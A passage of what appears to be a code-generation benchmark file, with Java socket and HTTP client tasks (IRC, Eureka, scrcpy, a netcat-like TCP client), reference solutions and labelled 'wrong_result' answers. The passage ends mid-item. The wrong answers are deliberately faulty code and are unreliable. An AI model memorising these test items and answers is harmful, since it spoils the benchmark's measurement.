    "Canonical_solution": "import com.facebook.stetho.inspector.network.NetworkEventReporter;\nimport com.facebook.stetho.inspector.network.NetworkEventReporterImpl;\nimport com.facebook.stetho.inspector.network.SimpleTextInspectorWebSocketFrame;\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport javax.annotation.Nullable;\n\npublic class IRCClientConnection implements Closeable {\n    private final StethoReporter mReporter;\n    private final Socket mSocket;\n    private final BufferedReader mInput;\n    private final BufferedWriter mOutput;\n\n    public static IRCClientConnection connect(String host, int port) throws IOException {\n        StethoReporter reporter = new StethoReporter();\n        Socket socket = new Socket();\n        reporter.onPreConnect(host, port);\n        try {\n            socket.connect(new InetSocketAddress(host, port));\n            reporter.onPostConnect();\n        } catch (IOException e) {\n            reporter.onError(e);\n            try {\n                socket.close();\n                throw e;\n            } finally {\n                reporter.onClosed();\n            }\n        }\n        return new IRCClientConnection(reporter, socket, \"UTF-8\");\n    }\n\n    private IRCClientConnection(StethoReporter reporter, Socket socket, String charset) throws IOException {\n        mReporter = reporter;\n        mSocket = socket;\n        mInput = new BufferedReader(new InputStreamReader(socket.getInputStream(), charset));\n        mOutput = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(), charset));\n    }\n\n    @Nullable\n    public String read() throws IOException {\n        try {\n            String message = mInput.readLine();\n            if (message != null) {\n                mReporter.onReceive(message);\n                maybeHandleIncomingMessage(message);\n            }\n            return message;\n        } catch (IOException e) {\n            mReporter.onError(e);\n            throw e;\n        }\n    }\n\n    public void send(String message) throws IOException {\n        mReporter.onSend(message);\n        try {\n            mOutput.write(message + \"\\r\\n\");\n            mOutput.flush();\n        } catch (IOException e) {\n            mReporter.onError(e);\n            throw e;\n        }\n    }\n\n    private boolean maybeHandleIncomingMessage(String message) throws IOException {\n        if (message.startsWith(\"PING \")) {\n            send(\"PONG \" + message.substring(\"PING \".length()));\n            return true;\n        }\n        return false;\n    }\n\n    public void close() throws IOException {\n        try {\n            try {\n                mOutput.close();\n            } catch (IOException e) {\n                mReporter.onError(e);\n                throw e;\n            }\n        } finally {\n            try {\n                mSocket.close();\n            } catch (IOException e) {\n                mReporter.onError(e);\n                throw e;\n            } finally {\n                mReporter.onClosed();\n            }\n        }\n    }\n\n    private static class StethoReporter {\n        private final NetworkEventReporter mReporter;\n        private final String mRequestId;\n\n        public StethoReporter() {\n            mReporter = NetworkEventReporterImpl.get();\n            mRequestId = mReporter.nextRequestId();\n        }\n\n        public void onPreConnect(String host, int port) {\n            mReporter.webSocketCreated(mRequestId, \"irc://\" + host + \":\" + port);\n        }\n\n        public void onPostConnect() {\n            // Sadly, nothing to report...\n        }\n\n        public void onError(IOException e) {\n            mReporter.webSocketFrameError(mRequestId, e.getMessage());\n        }\n\n        public void onClosed() {\n            mReporter.webSocketClosed(mRequestId);\n        }\n\n        public void onSend(String message) {\n            mReporter.webSocketFrameSent(new SimpleTextInspectorWebSocketFrame(mRequestId, message));\n        }\n\n        public void onReceive(String message) {\n            mReporter.webSocketFrameReceived(new SimpleTextInspectorWebSocketFrame(mRequestId, message));\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class IRCClientConnection implements Closeable {\n    private final StethoReporter mReporter;\n    private final Socket mSocket;\n    private final BufferedReader mInput;\n    private final BufferedWriter mOutput;\n\n    public class StethoReporter {\n        public void onConnect() {\n            // Stetho event reporting logic\n        }\n\n        public void onDisconnect() {\n            // Stetho event reporting logic\n        }\n\n        public void onSend(String message) {\n            // Stetho event reporting logic\n        }\n\n        public void onReceive(String message) {\n            // Stetho event reporting logic\n        }\n    }\n\n    public static IRCClientConnection connect(String host, int port) {\n        try {\n            Socket socket = new Socket(host, port);\n            IRCClientConnection instance = new IRCClientConnection();\n            instance.mReporter = new StethoReporter();\n            instance.mSocket = socket;\n            instance.mInput = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            instance.mOutput = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n            instance.mReporter.onConnect();\n            return instance;\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to connect to IRC server\", e);\n        }\n    }\n\n    public String read() {\n        try {\n            String message = mInput.readLine();\n            if (message != null) {\n                mReporter.onReceive(message);\n                if (maybeHandleIncomingMessage(message)) {\n                    return \"PONG \" + System.currentTimeMillis();\n                }\n            }\n            return message;\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    public void send(String message) {\n        try {\n            mOutput.write(message + \"\\r\\n\");\n            mOutput.flush();\n            mReporter.onSend(message);\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n\n    public boolean maybeHandleIncomingMessage(String message) {\n        if (message.startsWith(\"PING\")) {\n            mReporter.onReceive(message);\n            send(\"PONG \" + System.currentTimeMillis());\n            return true;\n        }\n        return false;\n    }\n\n    public void close() {\n        try {\n            if (mOutput != null) mOutput.close();\n            if (mInput != null) mInput.close();\n            if (mSocket != null) mSocket.close();\n            mReporter.onDisconnect();\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n}"
  },
  {
    "Task_id": 57,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously to fetch data from a given URL and process the response as a JSON object.\n\nClass Description: HttpRequestHandler is a utility class that contains nested classes and methods for performing asynchronous HTTP requests. It uses Android's AsyncTask to perform network operations in the background and processes the response data.\n\nAttributes: None (This is a utility class with static methods and nested classes)\n\nMethods:\n\nMethod1: MyAsyncTaskgetNews(String... params) -> String - A nested AsyncTask class that performs HTTP GET requests in the background. It takes a URL as input, establishes a connection, reads the response, and publishes the progress for JSON processing.\n\nMethod2: ConvertInputToStringNoChange(InputStream inputStream) -> String - A static helper method that converts an InputStream into a String by reading all lines from the input stream and concatenating them.\n\nMethod Details:\n\nMyAsyncTaskgetNews:\n- Input Parameters: String... params (varargs where params[0] should be the URL string)\n- Return Type: String (though it primarily works through side effects)\n- Description: \n  1. Creates a URL object from the input string\n  2. Opens an HttpURLConnection with a 7-second timeout\n  3. Reads the input stream and converts it to a string\n  4. Publishes the result for JSON processing in onProgressUpdate\n  5. Disconnects the connection when done\n\nConvertInputToStringNoChange:\n- Input Parameters: InputStream inputStream (the stream to read from)\n- Return Type: String (the concatenated content of the stream)\n- Description:\n  1. Creates a BufferedReader from the InputStream\n  2. Reads all lines and concatenates them into a single string\n  3. Closes the input stream\n  4. Returns the concatenated string",
    "Canonical_solution": "import android.os.AsyncTask;\nimport org.json.JSONObject;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    NewsData = ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONObject json = new JSONObject(progress[0]);\n            } catch (Exception ex) {}\n        }\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) {\n        BufferedReader bureader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String linereultcal = \"\";\n\n        try {\n            while((line = bureader.readLine()) != null) {\n                linereultcal += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return linereultcal;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpRequestHandler {\n    public static class MyAsyncTaskgetNews extends android.os.AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            String url = params[0];\n            try {\n                java.net.URL urlObj = new java.net.URL(url);\n                java.net.HttpURLConnection connection = (java.net.HttpURLConnection) urlObj.openConnection();\n                connection.setConnectTimeout(7000);\n                connection.setReadTimeout(7000);\n                connection.setRequestMethod(\"GET\");\n                connection.connect();\n                java.io.InputStream inputStream = connection.getInputStream();\n                String response = ConvertInputToStringNoChange(inputStream);\n                publishProgress(response);\n                connection.disconnect();\n                return response;\n            } catch (Exception e) {\n                e.printStackTrace();\n                return null;\n            }\n        }\n\n        @Override\n        protected void onProgressUpdate(String... values) {\n            // Process JSON here\n        }\n    }\n\n    public static String ConvertInputToStringNoChange(java.io.InputStream inputStream) {\n        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));\n        StringBuilder stringBuilder = new StringBuilder();\n        String line;\n        try {\n            while ((line = reader.readLine()) != null) {\n                stringBuilder.append(line);\n            }\n            reader.close();\n        } catch (java.io.IOException e) {\n            e.printStackTrace();\n        }\n        return stringBuilder.toString();\n    }\n\n    public String getNews(String... params) {\n        new MyAsyncTaskgetNews().execute(params);\n        return \"RESULT\";\n    }\n}"
  },
  {
    "Task_id": 572,
    "Instruction": "Task Description: Create a function that establishes a TCP client connection to a server, sends data from an input stream, and verifies the successful transmission of data.\n\nFunction Description: The function should establish a connection to a server using a Socket, send data from an input stream to the server via an output stream, and ensure the data was transmitted successfully. It should also handle resource cleanup and verify the progress of the transmission.\n\nInput: \n- uri: [URI] - The URI object containing the host and port of the server to connect to.\n- inputStream: [InputStream] - The input stream containing the data to be sent to the server.\n- parser: [Object] - An object that manages the start and stop of the parsing process (assumed to have start() and stop() methods).\n\nOutput: \n- bytes: [long] - The number of bytes successfully transmitted to the server.\n- The function also asserts that the socket is connected, the number of bytes transmitted is greater than 0, and the progress of the transmission matches the expected progress. \n\nNote: The function may throw IOException, InterruptedException, or URISyntaxException.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.net.URISyntaxException;\n\npublic void testNormal() throws IOException, InterruptedException, URISyntaxException {\n    parser.start();\n\n    Socket client = new Socket(uri.getHost(), uri.getPort());\n    assertTrue(\"Socket is connected\", client.isConnected());\n\n    InputStream inputStream = combineResource(Progresses.allFiles);\n    OutputStream outputStream = client.getOutputStream();\n\n    long bytes = ByteStreams.copy(inputStream, outputStream);\n\n    Thread.sleep(100);\n\n    client.close();\n    parser.stop();\n\n    assertThat(bytes, greaterThan(0L));\n    assertThat(progesses, equalTo(Progresses.allProgresses));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "public static long sendData(URI uri, InputStream inputStream, Object parser) throws IOException, URISyntaxException, InterruptedException {\n    if (uri == null) throw new IllegalArgumentException(\"URI cannot be null\");\n    String host = uri.getHost();\n    int port = uri.getPort();\n    if (host == null || host.isEmpty()) throw new URISyntaxException(uri, \"Invalid host\");\n    if (port <= 0) port = 80;\n\n    Socket socket = new Socket(host, port);\n    if (!socket.isConnected()) throw new IOException(\"Failed to connect to server\");\n\n    OutputStream outputStream = socket.getOutputStream();\n    byte[] buffer = new byte[1024];\n    int bytesRead;\n    long bytesSent = 0;\n\n    while ((bytesRead = inputStream.read(buffer)) != -1) {\n        outputStream.write(buffer, 0, bytesRead);\n        bytesSent += bytesRead;\n    }\n\n    outputStream.close();\n    socket.close();\n\n    if (bytesSent <= 0) throw new AssertionError(\"No bytes transmitted\");\n\n    ((Parser) parser).start();\n    ((Parser) parser).stop();\n\n    return bytesSent;\n}"
  },
  {
    "Task_id": 573,
    "Instruction": "Task Description: Implement a TCP client class in Java that can establish a connection to a server, send and receive data, and properly close the connection.\n\nClass Description: The GaNetCat class provides functionality for TCP client-server communication. It encapsulates socket operations, including connection establishment, data transmission, and resource cleanup.\n\nAttributes:\n- socket: Socket - The underlying socket used for network communication\n- inputStream: InputStream - Stream for receiving data from the server\n- outputStream: OutputStream - Stream for sending data to the server\n\nMethods:\n- connect(String host, int port) -> void - Establishes a connection to the specified server host and port. Throws IOException if connection fails.\n- sendData(InputStream source) -> void - Reads data from the source InputStream and sends it to the server through the output stream. Throws IOException if transmission fails.\n- receiveData(OutputStream destination) -> void - Receives data from the server and writes it to the destination OutputStream. Stops when encountering EOF or 0x04 (EOT) character. Throws IOException if reception fails.\n- close() -> void - Closes all resources (input stream, output stream, and socket) quietly, suppressing any exceptions during closure.",
    "Canonical_solution": "import org.apache.commons.io.IOUtils;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\n\npublic class GaNetCat {\n\n    private Socket socket;\n    private InputStream inputStream;\n    private OutputStream outputStream;\n\n    public void connect(String host, int port) throws IOException {\n        socket = new Socket();\n        socket.connect(new InetSocketAddress(host, port));\n        inputStream = socket.getInputStream();\n        outputStream = socket.getOutputStream();\n    }\n\n    public void sendData(InputStream source) throws IOException {\n        byte[] dataArray = new byte[1024];\n        int length;\n        do {\n            length = source.read(dataArray);\n            if (length <= 0) {\n                break;\n            }\n            outputStream.write(dataArray, 0, length);\n            outputStream.flush();\n        } while (length > 0);\n    }\n\n    public void receiveData(OutputStream destination) throws IOException {\n        byte[] dataArray = new byte[1024];\n        int length;\n        do {\n            length = inputStream.read(dataArray);\n            if (length == 1 && dataArray[0] == 0x04) {\n                destination.flush();\n                break;\n            }\n            if (length <= 0) {\n                break;\n            }\n            destination.write(dataArray, 0, length);\n        } while (length > 0);\n    }\n\n    public void close() {\n        IOUtils.closeQuietly(inputStream);\n        IOUtils.closeQuietly(outputStream);\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            // ignore\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class GaNetCat {\n    private Socket socket;\n    private InputStream inputStream;\n    private OutputStream outputStream;\n\n    public void connect(String host, int port) throws IOException {\n        socket = new Socket(host, port);\n        inputStream = socket.getInputStream();\n        outputStream = socket.getOutputStream();\n    }\n\n    public void sendData(InputStream source) throws IOException {\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = source.read(buffer)) != -1) {\n            outputStream.write(buffer, 0, bytesRead);\n        }\n    }\n\n    public void receiveData(OutputStream destination) throws IOException {\n        int b;\n        while ((b = inputStream.read()) != -1) {\n            if (b == 0x04) {\n                break;\n            }\n            destination.write(b);\n        }\n    }\n\n    public void close() {\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n            if (inputStream != null) {\n                inputStream.close();\n            }\n            if (outputStream != null) {\n                outputStream.close();\n            }\n        } catch (IOException e) {\n            // Suppress exceptions\n        }\n    }\n}"
  },
  {
    "Task_id": 574,
    "Instruction": "Task Description: Create a function that establishes a TCP client connection to a service discovered via Eureka, sends a request, and processes the response.\n\nFunction Description: The function uses Eureka client to discover a service instance, establishes a socket connection to the discovered service, sends a formatted request string, and reads the response. It handles connection errors and IO exceptions appropriately.\n\nInput: \n- eurekaClient: EurekaClient - The Eureka client instance used for service discovery\n- (implicit) vipAddress: String - The virtual IP address of the service to discover (\"sampleservice.mydomain.net\")\n\nOutput: \n- void - The function doesn't return a value but prints the server response or error messages to standard output/error\n- Side effect: Establishes a network connection and communicates with the discovered service\n\nNote: The function includes error handling for service discovery failures, connection issues, and IO operations. The request string is dynamically generated with a timestamp.",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.PrintStream;\nimport java.io.IOException;\n\npublic void sendRequestToServiceUsingEureka(EurekaClient eurekaClient) {\n    String vipAddress = \"sampleservice.mydomain.net\";\n\n    InstanceInfo nextServerInfo = null;\n    try {\n        nextServerInfo = eurekaClient.getNextServerFromEureka(vipAddress, false);\n    } catch (Exception e) {\n        System.err.println(\"Cannot get an instance of example service to talk to from eureka\");\n        System.exit(-1);\n    }\n\n    Socket s = new Socket();\n    int serverPort = nextServerInfo.getPort();\n    try {\n        s.connect(new InetSocketAddress(nextServerInfo.getHostName(), serverPort));\n    } catch (IOException e) {\n        System.err.println(\"Could not connect to the server :\"\n                + nextServerInfo.getHostName() + \" at port \" + serverPort);\n    } catch (Exception e) {\n        System.err.println(\"Could not connect to the server :\"\n                + nextServerInfo.getHostName() + \" at port \" + serverPort + \"due to Exception \" + e);\n    }\n    try {\n        String request = \"FOO \" + new Date();\n\n        PrintStream out = new PrintStream(s.getOutputStream());\n        out.println(request);\n\n        BufferedReader rd = new BufferedReader(new InputStreamReader(s.getInputStream()));\n        String str = rd.readLine();\n        if (str != null) {\n            System.out.println(\"Received response from server: \" + str);\n        }\n        rd.close();\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "public void connectToService(EurekaClient eurekaClient) {\n    try {\n        List<ServiceInstance> instances = eurekaClient.getInstances(\"sampleservice.mydomain.net\", false);\n        if (instances.isEmpty()) {\n            System.err.println(\"No service instances found in Eureka.\");\n            return;\n        }\n        ServiceInstance instance = instances.get(0);\n        String host = instance.getHost();\n        int port = instance.getPort();\n        try (Socket socket = new Socket(host, port)) {\n            long timestamp = System.currentTimeMillis();\n            String request = \"Request: \" + timestamp + \"\\r\\n\";\n            try (OutputStream out = socket.getOutputStream();\n                 PrintWriter writer = new PrintWriter(out)) {\n                writer.println(request);\n                writer.flush();\n            }\n            try (InputStream in = socket.getInputStream();\n                 BufferedReader reader = new BufferedReader(new InputStreamReader(in))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(line);\n                }\n            }\n        } catch (IOException e) {\n            System.err.println(\"Connection error: \" + e.getMessage());\n        }\n    } catch (Exception e) {\n        System.err.println(\"Service discovery error: \" + e.getMessage());\n    }\n}"
  },
  {
    "Task_id": 575,
    "Instruction": "Task Description: Implement a Java class that establishes a TCP client connection to a server, sends a command, and retrieves the server's response using socket programming.\n\nClass Description: The FourLetterCommand class provides functionality to connect to a server, send a command string, and receive the server's response. It handles socket creation, connection, data transmission, and resource cleanup.\n\nAttributes:\n- host: String - The hostname or IP address of the server to connect to\n- port: int - The port number on which the server is listening\n\nMethods:\n- FourLetterCommand(String host, int port) -> None - Constructor that initializes the host and port attributes\n- request(String command) -> String - Establishes a connection to the server, sends the command, and returns the server's response\n- response(Socket client) -> String - Reads the server's response from the socket input stream and returns it as a string\n- cleanup(Closeable c) -> void - Closes the provided Closeable resource (socket or stream) and handles any IOExceptions silently",
    "Canonical_solution": "import java.io.*;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\n\npublic class FourLetterCommand {\n\n    private String host;\n    private int port;\n\n    public FourLetterCommand(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String request(String command) {\n        final Socket socket = new Socket();\n        try {\n            socket.connect(new InetSocketAddress(host, port));\n            OutputStream outputStream = socket.getOutputStream();\n            outputStream.write(command.getBytes());\n            outputStream.flush();\n            return response(socket);\n        } catch (IOException e) {\n            throw new IllegalStateException(e);\n        }\n    }\n\n    private String response(Socket client) {\n        try {\n            var reader = new BufferedReader(new InputStreamReader(client.getInputStream()));\n            var builder = new StringBuilder(\"\");\n            String str;\n            while ((str = reader.readLine()) != null) {\n                builder.append(str).append(\"\\n\");\n            }\n            cleanup(client);\n            return builder.toString();\n        } catch (Exception e) {\n            throw new IllegalStateException(e);\n        }\n    }\n\n    private void cleanup(Closeable c) {\n        if (c != null) {\n            try {\n                c.close();\n            } catch (IOException e) {\n                // ignore\n            }\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class FourLetterCommand {\n    private String host;\n    private int port;\n\n    public FourLetterCommand(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String request(String command) throws IOException {\n        try (Socket client = new Socket(host, port)) {\n            try (OutputStream out = client.getOutputStream();\n                 InputStream in = client.getInputStream()) {\n                byte[] cmdBytes = command.getBytes(StandardCharsets.UTF_8);\n                out.write(cmdBytes);\n                out.flush();\n                return response(client);\n            }\n        }\n    }\n\n    public String response(Socket client) throws IOException {\n        try (InputStream in = client.getInputStream();\n             BufferedReader reader = new BufferedReader(new InputStreamReader(in))) {\n            StringBuilder sb = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        }\n    }\n\n    public void cleanup(Closeable c) {\n        try {\n            if (c != null) {\n                c.close();\n            }\n        } catch (IOException e) {\n            // Ignore\n        }\n    }\n}"
  },
  {
    "Task_id": 576,
    "Instruction": "Task Description: Create a Java class that handles socket communication for receiving and processing video stream data from an Android device using scrcpy (Screen Copy) technology.\n\nClass Description: ScrcpyInputSocketThread is a thread class that establishes a socket connection to receive video stream data from an Android device, processes the NAL units (Network Abstraction Layer units) from the stream, and manages the communication lifecycle.\n\nAttributes:\n- log: Logger - Logger instance for recording operational information\n- iDevice: IDevice - Represents the connected Android device\n- dataQueue: BlockingQueue<byte[]> - Queue for storing processed video data packets\n- scrcpyLocalThread: ScrcpyLocalThread - Reference to the main scrcpy control thread\n- androidTestTaskBootThread: AndroidTestTaskBootThread - Reference to the Android test task thread\n- session: Session - WebSocket session for sending device information\n- BUFFER_SIZE: int (static final) - Maximum buffer size for video data (10MB)\n- READ_BUFFER_SIZE: int (static final) - Chunk size for reading from the input stream (5KB)\n\nMethods:\n- Constructor(IDevice, BlockingQueue<byte[]>, ScrcpyLocalThread, Session) -> void - Initializes the thread with device, data queue, control thread, and session references\n- run() -> void - Main thread execution that:\n  1. Sets up port forwarding for scrcpy\n  2. Establishes socket connection to localhost\n  3. Sends device screen dimensions via WebSocket\n  4. Continuously reads and processes video stream data\n  5. Manages resources cleanup on termination\n  6. Handles NAL unit detection and packetization\n\nThe class implements proper resource management by:\n1. Closing sockets and streams in finally blocks\n2. Removing port forwarding when done\n3. Cleaning up session references\n4. Interrupting related threads when needed\n5. Handling IOExceptions during communication",
    "Canonical_solution": "import com.android.ddmlib.IDevice;\nimport jakarta.websocket.Session;\nimport org.cloud.sonic.agent.bridge.android.AndroidDeviceBridgeTool;\nimport org.cloud.sonic.agent.common.maps.ScreenMap;\nimport org.cloud.sonic.agent.tests.android.AndroidTestTaskBootThread;\nimport org.cloud.sonic.agent.tools.BytesTool;\nimport org.cloud.sonic.agent.tools.PortTool;\nimport org.slf4j.Logger;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.concurrent.BlockingQueue;\n\npublic class ScrcpyInputSocketThread extends Thread {\n\n    private final Logger log = LoggerFactory.getLogger(ScrcpyInputSocketThread.class);\n    private IDevice iDevice;\n    private BlockingQueue<byte[]> dataQueue;\n    private ScrcpyLocalThread scrcpyLocalThread;\n    private AndroidTestTaskBootThread androidTestTaskBootThread;\n    private Session session;\n    private static final int BUFFER_SIZE = 1024 * 1024 * 10;\n    private static final int READ_BUFFER_SIZE = 1024 * 5;\n\n    public ScrcpyInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, ScrcpyLocalThread scrcpyLocalThread, Session session) {\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.scrcpyLocalThread = scrcpyLocalThread;\n        this.session = session;\n        this.androidTestTaskBootThread = scrcpyLocalThread.getAndroidTestTaskBootThread();\n        this.setDaemon(false);\n        this.setName(androidTestTaskBootThread.formatThreadName(\"android-scrcpy-input-socket-task-%s-%s-%s\"));\n    }\n\n    @Override\n    public void run() {\n        int scrcpyPort = PortTool.getPort();\n        AndroidDeviceBridgeTool.forward(iDevice, scrcpyPort, \"scrcpy\");\n        Socket videoSocket = new Socket();\n        InputStream inputStream = null;\n        try {\n            videoSocket.connect(new InetSocketAddress(\"localhost\", scrcpyPort));\n            inputStream = videoSocket.getInputStream();\n            if (videoSocket.isConnected()) {\n                String sizeTotal = AndroidDeviceBridgeTool.getScreenSize(iDevice);\n                BytesTool.sendText(session, String.format(\"{\\\"msg\\\":\\\"size\\\",\\\"width\\\":\\\"%s\\\",\\\"height\\\":\\\"%s\\\"}\", \n                    sizeTotal.split(\"x\")[0], sizeTotal.split(\"x\")[1]));\n            }\n            int readLength;\n            int naLuIndex;\n            int bufferLength = 0;\n            byte[] buffer = new byte[BUFFER_SIZE];\n            while (scrcpyLocalThread.isAlive()) {\n                readLength = inputStream.read(buffer, bufferLength, READ_BUFFER_SIZE);\n                if (readLength > 0) {\n                    bufferLength += readLength;\n                    for (int i = 5; i < bufferLength - 4; i++) {\n                        if (buffer[i] == 0x00 &&\n                                buffer[i + 1] == 0x00 &&\n                                buffer[i + 2] == 0x00 &&\n                                buffer[i + 3] == 0x01\n                        ) {\n                            naLuIndex = i;\n                            byte[] naluBuffer = new byte[naLuIndex];\n                            System.arraycopy(buffer, 0, naluBuffer, 0, naLuIndex);\n                            dataQueue.add(naluBuffer);\n                            bufferLength -= naLuIndex;\n                            System.arraycopy(buffer, naLuIndex, buffer, 0, bufferLength);\n                            i = 5;\n                        }\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (scrcpyLocalThread.isAlive()) {\n                scrcpyLocalThread.interrupt();\n                log.info(\"scrcpy thread closed.\");\n            }\n            if (videoSocket.isConnected()) {\n                try {\n                    videoSocket.close();\n                    log.info(\"scrcpy video socket closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            if (inputStream != null) {\n                try {\n                    inputStream.close();\n                    log.info(\"scrcpy input stream closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n        AndroidDeviceBridgeTool.removeForward(iDevice, scrcpyPort, \"scrcpy\");\n        if (session != null) {\n            ScreenMap.getMap().remove(session);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class ScrcpyInputSocketThread extends Thread {\n    private final Logger log;\n    private final IDevice iDevice;\n    private final BlockingQueue<byte[]> dataQueue;\n    private final ScrcpyLocalThread scrcpyLocalThread;\n    private final AndroidTestTaskBootThread androidTestTaskBootThread;\n    private final Session session;\n    private static final int BUFFER_SIZE = 10 * 1024 * 1024;\n    private static final int READ_BUFFER_SIZE = 5 * 1024;\n\n    public ScrcpyInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, ScrcpyLocalThread scrcpyLocalThread, Session session) {\n        this.log = Logger.getLogger(ScrcpyInputSocketThread.class.getName());\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.scrcpyLocalThread = scrcpyLocalThread;\n        this.androidTestTaskBootThread = androidTestTaskBootThread;\n        this.session = session;\n    }\n\n    @Override\n    public void run() {\n        try {\n            iDevice.forwardPort(8080, 8080);\n            Socket socket = new Socket(\"localhost\", 8080);\n            OutputStream out = socket.getOutputStream();\n            InputStream in = socket.getInputStream();\n\n            int width = iDevice.getDisplayWidth();\n            int height = iDevice.getDisplayHeight();\n            session.getAsyncRemote().sendText(\"{\\\"width\\\":\" + width + \",\\\"height\\\":\" + height + \"}\");\n\n            byte[] buffer = new byte[READ_BUFFER_SIZE];\n            int bufferPos = 0;\n            while (true) {\n                int bytesRead = in.read(buffer, bufferPos, buffer.length - bufferPos);\n                if (bytesRead == -1) break;\n                bufferPos += bytesRead;\n                processNALUnits(buffer, bufferPos);\n                bufferPos = 0;\n            }\n        } catch (IOException e) {\n            log.severe(\"Error in ScrcpyInputSocketThread: \" + e.getMessage());\n        } finally {\n            try {\n                if (socket != null) socket.close();\n                if (in != null) in.close();\n                if (out != null) out.close();\n            } catch (IOException e) {\n                log.severe(\"Error closing resources: \" + e.getMessage());\n            }\n            iDevice.removePortForwarding(8080);\n            session.close();\n            scrcpyLocalThread.interrupt();\n            androidTestTaskBootThread.interrupt();\n        }\n    }\n\n    private void processNALUnits(byte[] buffer, int bufferPos) {\n        int startCodePos = -1;\n        for (int i = 0; i <= bufferPos - 3; i++) {\n            if (buffer[i] == 0x00 && buffer[i + 1] == 0x00 && buffer[i + 2] == 0x01) {\n                startCodePos = i;\n                break;\n            }\n        }\n        if (startCodePos != -1) {\n            byte[] nalUnit = new byte[bufferPos - startCodePos];\n            System.arraycopy(buffer, startCodePos, nalUnit, 0, nalUnit.length);\n            dataQueue.put(nalUnit);\n        }\n    }\n}"
  },
  {
    "Task_id": 578,
    "Instruction": "Task Description: Implement a Java class for sending HTTP requests and receiving responses using socket communication.\n\nClass Description: The HTTPRequest class extends HTTPPacket and provides functionality to send HTTP POST requests to a specified server. It handles connection management, request formatting, and response processing, with support for keep-alive connections and chunked transfer encoding.\n\nAttributes:\npostSocket: Socket - The socket used for communication with the server\n\nMethods:\npost: [Name](host: String, port: int, isKeepAlive: boolean) -> HTTPResponse - Sends an HTTP POST request to the specified host and port, with optional keep-alive connection\npost: [Name](host: String, port: int) -> HTTPResponse - Sends an HTTP POST request to the specified host and port with connection closing by default (calls the 3-parameter version with isKeepAlive=false)",
